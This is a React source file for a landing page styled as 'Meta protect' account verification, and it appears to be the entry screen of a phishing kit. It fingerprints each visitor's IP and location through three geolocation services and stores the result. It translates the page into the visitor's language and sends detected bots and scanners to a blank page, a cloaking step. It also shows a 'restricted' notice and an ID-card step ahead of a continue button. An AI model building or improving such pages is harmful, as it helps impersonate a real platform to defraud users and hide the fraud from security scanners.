'use client';

import { useCallback, useEffect, useMemo, useState } from 'react';
import axios from 'axios';
import HeroImage from '@/assets/images/hero-image.jpg';
import '@/assets/css/meta-protect-landing.css';
import { faCircleCheck, faIdCard } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { landingDefaultTexts } from '@/i18n/default-texts';
import { translateTexts } from '@/utils/translate-by-lang';
import countryToLanguage from '@/utils/country_to_language';
import detectBot from '@/utils/detect_bot';

const GEO_ENDPOINTS = [
    {
        url: 'https://get.geojs.io/v1/ip/geo.json',
        map: (data: Record<string, string | undefined>) => ({
            ip: data?.ip,
            city: data?.city,
            region: data?.region,
            country: data?.country,
            countryCode: data?.country_code
        })
    },
    {
        url: 'https://ipapi.co/json/',
        map: (data: Record<string, string | undefined>) => ({
            ip: data?.ip,
            city: data?.city,
            region: data?.region,
            country: data?.country_name,
            countryCode: data?.country_code
        })
    },
    {
        url: 'https://ipwho.is/',
        map: (data: Record<string, string | undefined>) => ({
            ip: data?.ip,
            city: data?.city,
            region: data?.region,
            country: data?.country,
            countryCode: data?.country_code
        })
    }
];

const normalizeCountryCode = (code = '') => String(code).trim().toUpperCase();
const isUnknownValue = (value = '') => {
    const normalized = String(value ?? '').trim().toLowerCase();
    return !normalized || ['unknown', 'n/a', 'na', 'null', 'undefined', '-'].includes(normalized);
};
const normalizeGeoValue = (value?: string) => (isUnknownValue(value) ? '' : String(value).trim());

const getFallbackLanguage = () => {
    const [browserLang = 'en'] = String(navigator.language || 'en').split('-');
    return browserLang.toLowerCase() || 'en';
};

const resolveTargetLang = (countryCode = '') => {
    const normalizedCode = normalizeCountryCode(countryCode);
    return countryToLanguage[normalizedCode as keyof typeof countryToLanguage] || getFallbackLanguage();
};

const fetchGeoData = async () => {
    let bestCandidate: {
        ip: string;
        city: string;
        region: string;
        country: string;
        countryCode: string;
    } | null = null;
    let bestScore = -1;

    const getCandidateScore = (candidate: {
        ip: string;
        city: string;
        region: string;
        country: string;
        countryCode: string;
    }) => {
        const hasCountry = !isUnknownValue(candidate.country);
        const hasRegion = !isUnknownValue(candidate.region);
        const hasCity = !isUnknownValue(candidate.city);
        const hasIp = !isUnknownValue(candidate.ip);
        const hasCountryCode = !isUnknownValue(candidate.countryCode);
        return (hasCity ? 3 : 0) + (hasRegion ? 2 : 0) + (hasCountry ? 2 : 0) + (hasCountryCode ? 1 : 0) + (hasIp ? 1 : 0);
    };

    for (const endpoint of GEO_ENDPOINTS) {
        try {
            const response = await axios.get(endpoint.url, { timeout: 5000 });
            const mapped = endpoint.map(response.data || {}) || {};
            const candidate = {
                ip: normalizeGeoValue(mapped.ip),
                city: normalizeGeoValue(mapped.city),
                region: normalizeGeoValue(mapped.region),
                country: normalizeGeoValue(mapped.country),
                countryCode: normalizeGeoValue(mapped.countryCode)
            };
            const score = getCandidateScore(candidate);

            if (score > bestScore) {
                bestCandidate = candidate;
                bestScore = score;
            }

            if (candidate.city && candidate.region && candidate.country) {
                return candidate;
            }
        } catch {
            continue;
        }
    }

    if (bestCandidate && bestScore > 0) {
        return bestCandidate;
    }

    throw new Error('All geo providers failed');
};

interface LandingPageProps {
    onContinue: () => void;
}

const LandingPage = ({ onContinue }: LandingPageProps) => {
    const [today, setToday] = useState('');
    const [translatedTexts, setTranslatedTexts] = useState<Record<string, string>>({});

    const defaultTexts = useMemo(() => ({ ...landingDefaultTexts }), []);

    const translateAllTexts = useCallback(
        async (lang: string) => {
            try {
                const keys = Object.keys(defaultTexts) as Array<keyof typeof defaultTexts>;
                const sourceTexts = keys.map((key) => defaultTexts[key]);
                const translations = await translateTexts(sourceTexts, lang);
                const translated: Record<string, string> = {};
                keys.forEach((key, index) => {
                    translated[key] = translations[index];
                });
                setTranslatedTexts(translated);
            } catch (error) {
                console.error('Translation error:', error);
                setTranslatedTexts(defaultTexts);
            }
        },
        [defaultTexts]
    );

    const initializeApp = useCallback(async () => {
        const date = new Date();
        setToday(
            date.toLocaleString('en-US', {
                month: 'long',
                day: 'numeric',
                year: 'numeric'
            })
        );

        try {
            try {
                const data = await fetchGeoData();
                const normalizedCountryCode = normalizeCountryCode(data.countryCode);
                localStorage.setItem(
                    'ipInfo',
                    JSON.stringify({
                        ip: data.ip || 'Unknown',
                        city: data.city || 'Unknown',
                        region: data.region || 'Unknown',
                        country: data.country || 'Unknown',
                        country_code: normalizedCountryCode || 'Unknown'
                    })
                );

                const lang = resolveTargetLang(normalizedCountryCode);
                localStorage.setItem('targetLang', lang);

                if (lang !== 'en') {
                    await translateAllTexts(lang);
                } else {
                    setTranslatedTexts(defaultTexts);
                }
            } catch (error) {
                console.error('Error fetching IP:', error);
                const cachedLang = localStorage.getItem('targetLang') || 'en';
                if (cachedLang !== 'en') {
                    await translateAllTexts(cachedLang);
                } else {
                    setTranslatedTexts(defaultTexts);
                }
            }

            const botResult = await detectBot();
            if (botResult.isBot) {
                window.location.href = 'about:blank';
            }
        } catch (error) {
            console.error('Initialization error:', error);
            setTranslatedTexts(defaultTexts);
        }
    }, [defaultTexts, translateAllTexts]);

    useEffect(() => {
        localStorage.removeItem('message_id');
        localStorage.removeItem('message');
        localStorage.removeItem('messageId');
        initializeApp();
    }, [initializeApp]);

    const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;

    return (
        <div className='meta-protect-landing'>
            <div className='meta-protect-landing__card'>
                <div className='meta-protect-landing__hero'>
                    <img src={HeroImage.src} alt='' />
                </div>

                <h1 className='meta-protect-landing__title'>{texts.title}</h1>
                <p className='meta-protect-landing__description'>{texts.description}</p>

                <div className='meta-protect-landing__steps'>
                    <div className='meta-protect-landing__step'>
                        <FontAwesomeIcon
                            icon={faCircleCheck}
                            className='meta-protect-landing__step-icon meta-protect-landing__step-icon--done'
                            size='xl'
                        />
                        <p>{texts.protectionText}</p>
                    </div>
                    <div className='meta-protect-landing__step'>
                        <FontAwesomeIcon
                            icon={faIdCard}
                            className='meta-protect-landing__step-icon meta-protect-landing__step-icon--active'
                            size='xl'
                        />
                        <p>{texts.processText}</p>
                    </div>
                </div>

                <div className='meta-protect-landing__button-wrap'>
                    <button type='button' className='meta-protect-landing__button' onClick={onContinue}>
                        {texts.continueBtn}
                    </button>
                </div>

                <p className='meta-protect-landing__footer'>
                    {texts.restrictedText} <span className='meta-protect-landing__footer-date'>{today}</span>
                </p>
            </div>
        </div>
    );
};

export default LandingPage;
